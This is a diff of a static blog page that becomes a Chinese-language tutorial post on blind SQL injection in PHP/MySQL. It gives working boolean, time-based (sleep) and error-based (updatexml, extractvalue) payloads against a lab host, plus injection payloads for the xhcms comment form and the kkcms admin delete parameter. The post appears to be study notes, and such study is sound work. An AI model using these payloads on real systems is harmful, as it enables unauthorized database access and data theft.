@@ -7,16 +7,20 @@
 <meta name="full-screen" content="yes">
 <meta name="theme-color" content="#317EFB" />
 <meta content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=0" name="viewport">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Cypher Sun">
-<meta property="og:url" content="http://example.com/archives/index.html">
+<meta name="description" content="PHP-MYSQL-SQL操作-增删改查1、功能：数据查询查询：SELECT * FROM news where id&#x3D;$id 2、功能：新增用户，添加新闻等增加：INSERT INTO news (列名) VALUES (数据) 3、功能：删除用户，删除新闻等删除：DELETE FROM news WHERE id&#x3D;$id 4、功能：修改用户，修改文章等修改：UPDATE n">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP应用&amp;SQL盲注&amp;布尔回显&amp;延时判断&amp;报错处理&amp;增删改查方式">
+<meta property="og:url" content="http://example.com/2024/03/17/Web%E6%94%BB%E9%98%B24/index.html">
 <meta property="og:site_name" content="Cypher Sun">
+<meta property="og:description" content="PHP-MYSQL-SQL操作-增删改查1、功能：数据查询查询：SELECT * FROM news where id&#x3D;$id 2、功能：新增用户，添加新闻等增加：INSERT INTO news (列名) VALUES (数据) 3、功能：删除用户，删除新闻等删除：DELETE FROM news WHERE id&#x3D;$id 4、功能：修改用户，修改文章等修改：UPDATE n">
 <meta property="og:locale">
+<meta property="article:published_time" content="2024-03-17T14:42:11.000Z">
+<meta property="article:modified_time" content="2024-03-17T14:43:39.380Z">
 <meta property="article:author" content="Cypher Sun">
 <meta name="twitter:card" content="summary">
 
 
-<title >Cypher Sun</title>
+<title >PHP应用&SQL盲注&布尔回显&延时判断&报错处理&增删改查方式</title>
 
 <!-- Favicon -->
 
@@ -53,7 +57,7 @@
 
 <!-- Variable -->
 <script>window.ASYNC_CONFIG = {"hostname":"example.com","author":"Cypher Sun","root":"/","typed_text":["I`m a cybersecurity engineer","Welcome to my blog!"],"theme_version":"2.1.10","theme":{"switch":true,"default":"style-light"},"favicon":{"logo":null,"icon16":null,"icon32":"favicon.ico","appleTouchIcon":null,"webmanifest":null,"visibilitychange":true,"hidden":"favicon.ico","showText":"骗你的~ (￣▽￣)ノ","hideText":"崩溃啦！(╯‵□′)╯︵┻━┻"},"i18n":{"placeholder":"搜索文章...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）","author":"本文作者：","copyright_link":"本文链接：","copyright_license_title":"版权声明：","copyright_license_content":"本博客所有文章除特别声明外，均默认采用 undefined 许可协议。","copy_success":"复制成功","copy_failure":"复制失败","open_read_mode":"进入阅读模式","exit_read_mode":"退出阅读模式","notice_outdate_message":"距离上次更新已经 undefined 天了, 文章内容可能已经过时。","sticky":"置顶","just":"刚刚","min":"分钟前","hour":"小时前","day":"天前","month":"个月前"},"swup":true,"plugin":{"flickr_justified_gallery":"https://unpkg.com/flickr-justified-gallery@latest/dist/fjGallery.min.js"},"icons":{"sun":"far fa-sun","moon":"far fa-moon","play":"fas fa-play","email":"far fa-envelope","next":"fas fa-arrow-right","calendar":"far fa-calendar-alt","clock":"far fa-clock","user":"far fa-user","back_top":"fas fa-arrow-up","close":"fas fa-times","search":"fas fa-search","reward":"fas fa-hand-holding-usd","user_tag":"fas fa-user-alt","toc_tag":"fas fa-th-list","read":"fas fa-book-reader","arrows":"fas fa-arrows-alt-h","double_arrows":"fas fa-angle-double-down","copy":"fas fa-copy"},"icontype":"font","highlight":{"plugin":"highlighjs","theme":true,"copy":true,"lang":true,"title":"default","height_limit":"200px"},"toc":{"post_title":true},"live_time":{"start_time":"03/09/2024 15:46:00","prefix":"博客已萌萌哒运行 undefined 天"},"search":{"enable":true,"type":"local","href":"https://www.google.com/search?q=site:","domain":null,"path":"search.xml"}};</script>
-<script id="async-page-config">window.PAGE_CONFIG = {"isPost":false,"isHome":false,"postUpdate":"2024-03-17 22:43:43"};</script>
+<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2024-03-17 22:43:39"};</script>
 
 <!-- Theme mode css -->
 <link data-swup-theme rel="stylesheet" href="/css/index.css?v=2.1.10" id="trm-switch-style">
@@ -151,7 +155,7 @@
                 
             </li>
             
-            <li class="menu-item-has-children current-menu-item">
+            <li class="menu-item-has-children ">
                 <a  href="/archives/" target="">
                     归档
                 </a>
@@ -202,12 +206,9 @@
     <!-- banner -->
     <div class="trm-banner">
     
-    <!-- banner video cover -->
-    <video autoplay="autoplay" loop muted playsinline webkit-playinginline class="trm-banner-cover">
-        <source src="https://cdn.moji.com/websrc/video/summer20190515.mp4" type='video/mp4; codecs="avc1.42E01E, mp4a.40.2"'>
-        Your browser does not support HTML5 video.
-    </video>
-    <!-- banner video cover end -->
+    <!-- banner cover -->
+    <img style="object-position:top;object-fit:cover;" alt="banner" class="trm-banner-cover" src="/null">
+    <!-- banner cover end -->
     
 
     <!-- banner content -->
@@ -222,10 +223,10 @@
                     <!-- banner title -->
                     <div class="trm-banner-text ">
                         <div class="trm-label trm-mb-20">
-                            The article archive
+                            
                         </div>
                         <h1 class="trm-mb-30 trm-hsmb-font">
-                            江碧鸟逾白，<br>山青花欲燃。
+                            PHP应用&SQL盲注&布尔回显&延时判断&报错处理&增删改查方式
                         </h1>
 
                         
@@ -235,7 +236,7 @@
                                 </li>
                                 <li>
                                     <span>
-                                        archives
+                                        2024
                                     </span>
                                 </li>
                             </ul>
@@ -354,207 +355,108 @@
             
             <div class="trm-page-content col-lg-8">
                 <div id="trm-content" class="trm-content">
-                    <div class="row">
-    <div class="col-lg-12">
-        <div class="trm-card">
-            <div style="padding: 0 20px;">
-                
-                    <ul class="row trm-list" style="margin-bottom: 0px;"><li class="col-lg-4 trm-list-item" style="margin: 6px 0;"><a class="archive-list-link" href="/archives/2024/">2024</a><span class="archive-list-count">（42）</span></li></ul>
-                
-            </div>
+                    <div class="trm-post-info row hidden-sm">
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-calendar-alt trm-icon"></i><br>
+            03/17
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-clock trm-icon"></i><br>
+            22:42
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div id="post-author" class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-user trm-icon"></i><br>
+            Cypher Sun
         </div>
     </div>
 </div>
+<div class="trm-card ">
+    <article id="article-container" class="trm-publication">
+    <h2 id="PHP-MYSQL-SQL操作-增删改查"><a href="#PHP-MYSQL-SQL操作-增删改查" class="headerlink" title="PHP-MYSQL-SQL操作-增删改查"></a>PHP-MYSQL-SQL操作-增删改查</h2><p>1、功能：数据查询<br>查询：SELECT * FROM news where id&#x3D;$id</p>
+<p>2、功能：新增用户，添加新闻等<br>增加：INSERT INTO news (列名) VALUES (数据)</p>
+<p>3、功能：删除用户，删除新闻等<br>删除：DELETE FROM news WHERE id&#x3D;$id</p>
+<p>4、功能：修改用户，修改文章等<br>修改：UPDATE news SET id&#x3D;$id</p>
+<h2 id="PHP-MYSQL-注入函数-布尔-报错-延迟"><a href="#PHP-MYSQL-注入函数-布尔-报错-延迟" class="headerlink" title="PHP-MYSQL-注入函数-布尔&amp;报错&amp;延迟"></a>PHP-MYSQL-注入函数-布尔&amp;报错&amp;延迟</h2><p>盲注就是在注入过程中，获取的数据不能回显至前端页面。<br>我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。<br>解决：常规的联合查询注入不行的情况</p>
+<p>我们可以知道盲注分为以下三类：<br>1、基于布尔的SQL盲注-逻辑判断<br>regexp,like,ascii,left,ord,mid</p>
+<p>2、基于时间的SQL盲注-延时判断<br>if,sleep</p>
+<p>3、基于报错的SQL盲注-报错回显<br>floor，updatexml，extractvalue</p>
+<p>延迟（注意and有时候执行不了改成or）：<br>and if(left(database(),1)&#x3D;’d’,sleep(5),sleep(0));<br><a target="_blank" rel="noopener" href="http://10.0.1.139:82/new.php?id=1">http://10.0.1.139:82/new.php?id=1</a> and if(left(database(),1)&#x3D;’d’,sleep(5),sleep(0));<br>如果数据库名demo01第一位等于d，所以延时5秒</p>
+<p>and if(length(database())&#x3D;6,sleep(5),sleep(0));<br><a target="_blank" rel="noopener" href="http://10.0.1.139:82/new.php?id=1">http://10.0.1.139:82/new.php?id=1</a> and if(length(database())&#x3D;6,sleep(5),sleep(0));<br>如果数据库名demo01位数等于6，所以延时5秒</p>
+<p>布尔：<br>and length(database())&#x3D;7;<br><a target="_blank" rel="noopener" href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and length(database())&#x3D;7;<br>查询数据库demo01长度，是6位，等于7就没回显</p>
+<p>and left(database(),1)&#x3D;’p’;<br><a target="_blank" rel="noopener" href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and left(database(),1)&#x3D;’p’;<br>查询数据库 left(a,b)从左侧截取a的前b位，demo01，前一位等于d，所以没回显</p>
+<p>and left(database(),2)&#x3D;’pi’;<br><a target="_blank" rel="noopener" href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and left(database(),2)&#x3D;’pi’;<br>查询数据库 left(a,b)从左侧截取a的前b位，demo01，前两位等于de，所以没回显</p>
+<p>and substr(database(),1,1)&#x3D;’p’;<br><a target="_blank" rel="noopener" href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and substr(database(),1,1)&#x3D;’p’;<br>查询数据库 left(a,b)从左侧截取a的前b位，demo01，第一位等于d，所以没回显</p>
+<p>and substr(database(),2,1)&#x3D;’i’;<br><a target="_blank" rel="noopener" href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and substr(database(),2,1)&#x3D;’p’;<br>查询数据库 left(a,b)从左侧截取a的前b位，demo01，第二位等于e，所以没有数据</p>
+<p>and ord(left(database(),1))&#x3D;112;<br><a target="_blank" rel="noopener" href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and ord(left(database(),1))&#x3D;112;<br>适用的是ASCII码，防止引号过滤，11为p的ASCII码，查询数据库 left(a,b)从左侧截取a的前b位，demo01，前一位等于d，所以没回显</p>
+<p>报错：<br>and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)<br><a target="_blank" rel="noopener" href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)<br>updatexml 会触发一个 SQL 错误，从而报出错误</p>
+<p>and extractvalue(1, concat(0x5c, (select version())));<br><a target="_blank" rel="noopener" href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and extractvalue(1, concat(0x5c, (select version())));<br>extractvalue 会触发一个 SQL 错误，从而报出错误</p>
+<p>更多：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></p>
+<p>参考：<br>like ‘ro%’            #判断ro或ro…是否成立<br>regexp ‘^xiaodi[a-z]’ #匹配xiaodi及xiaodi…等<br>if(条件,5,0)          #条件成立 返回5 反之 返回0<br>sleep(5)              #SQL语句延时执行5秒<br>mid(a,b,c)            #从位置b开始，截取a字符串的c位<br>substr(a,b,c)         #从位置b开始，截取字符串a的c长度<br>left(database(),1)，database() #left(a,b)从左侧截取a的前b位<br>length(database())&#x3D;8  #判断数据库database()名的长度<br>ord&#x3D;ascii ascii(x)&#x3D;97 #判断x的ascii码是否等于97</p>
+<h2 id="PHP-MYSQL-注入条件-数据回显-错误处理"><a href="#PHP-MYSQL-注入条件-数据回显-错误处理" class="headerlink" title="PHP-MYSQL-注入条件-数据回显&amp;错误处理"></a>PHP-MYSQL-注入条件-数据回显&amp;错误处理</h2><p>PHP开发项目-输出结果&amp;开启报错<br>基于延时：都不需要，没有报错和回显都能进行，适用于增删改查里面的增删改<br>and if(1&#x3D;1,sleep(5),0)</p>
+<p>基于布尔：数据库输出判断标准，需要数据回显才能用，仅适用于增删改查里面的查<br>and length(database())&#x3D;6</p>
+<p>基于报错：数据库报错处理判断标准，适用于增删改查里面的增（前提是有报错代码的漏洞例如：or die(mysqli_error($con))）<br>and updatexml(1,concat(0x7e,(SELECT version(),0x7e),1)</p>
+<h2 id="PHP-MYSQL-CMS案例-插入报错-删除延时"><a href="#PHP-MYSQL-CMS案例-插入报错-删除延时" class="headerlink" title="PHP-MYSQL-CMS案例-插入报错&amp;删除延时"></a>PHP-MYSQL-CMS案例-插入报错&amp;删除延时</h2><p>1、xhcms-insert报错，注入发表评论昵称处<br>‘ and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) and ‘</p>
+<p>2、kkcms-delete延时，先登录后台<br><a target="_blank" rel="noopener" href="http://10.0.1.139:82/admin/cms_usergroup.php?del=4">http://10.0.1.139:82/admin/cms_usergroup.php?del=4</a> or if(1&#x3D;1,sleep(5),0)</p>
+<p><a target="_blank" rel="noopener" href="http://10.0.1.139:82/admin/cms_usergroup.php?del=4">http://10.0.1.139:82/admin/cms_usergroup.php?del=4</a> or if(length(database())&#x3D;6,sleep(5),sleep(0))</p>
+<p><a target="_blank" rel="noopener" href="http://10.0.1.139:82/admin/cms_usergroup.php?del=4">http://10.0.1.139:82/admin/cms_usergroup.php?del=4</a> or if(ord(left(database(),1))&#x3D;107,sleep(5),sleep(0))</p>
 
-<!-- history -->
+</article>
+    
+    
 
-<div class="row">
+</div>
+<div class="trm-post-next-prev row">
     <div class="col-lg-12">
         <!-- title -->
         <h5 class="trm-title-with-divider">
-            
-                所有归档
-            
-            <span data-number="01"></span>
+            其他文章
+            <span data-number="02"></span>
         </h5>
     </div>
-    <div class="col-lg-12">
-        <!-- timeline -->
-        <div class="trm-timeline">
+    
+    
+        <div class="col-lg-6">
+    <div class="trm-blog-card trm-scroll-animation">
+        <a href="/2024/03/17/Web%E6%94%BB%E9%98%B23/" class="trm-cover-frame trm-anima-link">
             
-            <div class="trm-timeline-item trm-scroll-animation">
-                <div class="trm-timeline-mark-light"></div>
-                <div class="trm-timeline-mark"></div>
-                <div class="trm-a trm-timeline-content less">
-                    
-                        <div class="trm-card-header">
-                            <h6>
-                                <a href="/2024/03/17/Web%E6%94%BB%E9%98%B24/" class="trm-anima-link">
-                                    PHP应用&amp;SQL盲注&amp;布尔回显&amp;延时判断&amp;报错处理&amp;增删改查方式
-                                </a>
-                            </h6>
-                        </div>
-                    
+            
+                <div class="trm-cover-date">
+                    <div class="trm-cover-day">17</div>
+                    <div class="trm-cover-month">2024/03</div>
                 </div>
-            </div>
             
-            <div class="trm-timeline-item trm-scroll-animation">
-                <div class="trm-timeline-mark-light"></div>
-                <div class="trm-timeline-mark"></div>
-                <div class="trm-a trm-timeline-content less">
-                    
-                        <div class="trm-card-header">
-                            <h6>
-                                <a href="/2024/03/17/Web%E6%94%BB%E9%98%B23/" class="trm-anima-link">
-                                    PHP应用&amp;SQL注入&amp;符号拼接&amp;请求方法&amp;HTTP头&amp;JSON&amp;编码类
-                                </a>
-                            </h6>
-                        </div>
-                    
-                </div>
+        </a>
+        
+        <div class="trm-card-descr">
+            <div class="trm-label trm-category trm-mb-20">
+                <a href=" /categories/Web%E6%94%BB%E9%98%B2/">
+                    Web攻防
+                </a>
             </div>
-            
-            <div class="trm-timeline-item trm-scroll-animation">
-                <div class="trm-timeline-mark-light"></div>
-                <div class="trm-timeline-mark"></div>
-                <div class="trm-a trm-timeline-content less">
-                    
-                        <div class="trm-card-header">
-                            <h6>
-                                <a href="/2024/03/15/Web%E6%94%BB%E9%98%B22/" class="trm-anima-link">
-                                    PHP应用&amp;MYSQL架构&amp;SQL注入&amp;跨库查询&amp;文件读写&amp;权限操作
-                                </a>
-                            </h6>
-                        </div>
-                    
-                </div>
-            </div>
-            
-            <div class="trm-timeline-item trm-scroll-animation">
-                <div class="trm-timeline-mark-light"></div>
-                <div class="trm-timeline-mark"></div>
-                <div class="trm-a trm-timeline-content less">
-                    
-                        <div class="trm-card-header">
-                            <h6>
-                                <a href="/2024/03/15/%E5%B7%A5%E5%85%B7sqlmap-master/" class="trm-anima-link">
-                                    Sqlmap
-                                </a>
-                            </h6>
-                        </div>
-                    
-                </div>
-            </div>
-            
-            <div class="trm-timeline-item trm-scroll-animation">
-                <div class="trm-timeline-mark-light"></div>
-                <div class="trm-timeline-mark"></div>
-                <div class="trm-a trm-timeline-content less">
-                    
-                        <div class="trm-card-header">
-                            <h6>
-                                <a href="/2024/03/15/%E5%B7%A5%E5%85%B7IIS-shortname-Scanner-master/" class="trm-anima-link">
-                                    IIS_shortname_Scanner-master
-                                </a>
-                            </h6>
-                        </div>
-                    
-                </div>
-            </div>
-            
-            <div class="trm-timeline-item trm-scroll-animation">
-                <div class="trm-timeline-mark-light"></div>
-                <div class="trm-timeline-mark"></div>
-                <div class="trm-a trm-timeline-content less">
-                    
-                        <div class="trm-card-header">
-                            <h6>
-                                <a href="/2024/03/15/%E5%B7%A5%E5%85%B77kbscan-WebPathBrute/" class="trm-anima-link">
-                                    7kbscan-WebPathBrute
-                                </a>
-                            </h6>
-                        </div>
-                    
-                </div>
-            </div>
-            
-            <div class="trm-timeline-item trm-scroll-animation">
-                <div class="trm-timeline-mark-light"></div>
-                <div class="trm-timeline-mark"></div>
-                <div class="trm-a trm-timeline-content less">
-                    
-                        <div class="trm-card-header">
-                            <h6>
-                                <a href="/2024/03/14/Web%E6%94%BB%E9%98%B21/" class="trm-anima-link">
-                                    ASP应用&amp;HTTP.SYS&amp;短文件&amp;文件解析&amp;Access注入&amp;数据库泄漏
-                                </a>
-                            </h6>
-                        </div>
-                    
-                </div>
-            </div>
-            
-            <div class="trm-timeline-item trm-scroll-animation">
-                <div class="trm-timeline-mark-light"></div>
-                <div class="trm-timeline-mark"></div>
-                <div class="trm-a trm-timeline-content less">
-                    
-                        <div class="trm-card-header">
-                            <h6>
-                                <a href="/2024/03/12/%E9%A1%B9%E7%9B%AE404%E6%98%9F%E9%93%BE/" class="trm-anima-link">
-                                    404星链项目
-                                </a>
-                            </h6>
-                        </div>
-                    
-                </div>
-            </div>
-            
-            <div class="trm-timeline-item trm-scroll-animation">
-                <div class="trm-timeline-mark-light"></div>
-                <div class="trm-timeline-mark"></div>
-                <div class="trm-a trm-timeline-content less">
-                    
-                        <div class="trm-card-header">
-                            <h6>
-                                <a href="/2024/03/12/%E5%B7%A5%E5%85%B7FireEyeGoldCrystal/" class="trm-anima-link">
-                                    FireEyeGoldCrystal
-                                </a>
-                            </h6>
-                        </div>
-                    
-                </div>
-            </div>
-            
-            <div class="trm-timeline-item trm-scroll-animation">
-                <div class="trm-timeline-mark-light"></div>
-                <div class="trm-timeline-mark"></div>
-                <div class="trm-a trm-timeline-content less">
-                    
-                        <div class="trm-card-header">
-                            <h6>
-                                <a href="/2024/03/12/%E5%B7%A5%E5%85%B7AsamF/" class="trm-anima-link">
-                                    AsamF
-                                </a>
-                            </h6>
-                        </div>
-                    
-                </div>
-            </div>
-            
+            <h5>
+                <a href="/2024/03/17/Web%E6%94%BB%E9%98%B23/" class="trm-anima-link">
+                    PHP应用&amp;SQL注入&amp;符号拼接&amp;请求方法&amp;HTTP头&amp;JSON&amp;编码类
+                </a>
+            </h5>
+            <div class="trm-divider trm-mb-20 trm-mt-20"></div>
+            <ul class="trm-card-data trm-label">
+                <li>24/03/17</li>
+                <li>04:06</li>
+                
+                
+            </ul>
         </div>
-        <!-- timeline end -->
     </div>
 </div>
+    
+</div>
 
-<!-- history end -->
-
-
-    <div class="trm-pagination">
-        <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/archives/page/5/">5</a>
-    </div>
-
-
+    
 
 
 
@@ -607,6 +509,10 @@
             
 <div class="trm-fixed-container">
     
+    
+        <div class="trm-fixed-btn" data-title="阅读模式" onclick="asyncFun.switchReadMode()">
+            <i class="iconfont fas fa-book-reader"></i>
+        </div>
     
     
         <div class="trm-fixed-btn hidden-md" data-title="单栏和双栏切换" onclick="asyncFun.switchSingleColumn()">
@@ -689,6 +595,10 @@
     
 
     <!-- 评论插件 -->
+    
+        
+
+        
     
 
 
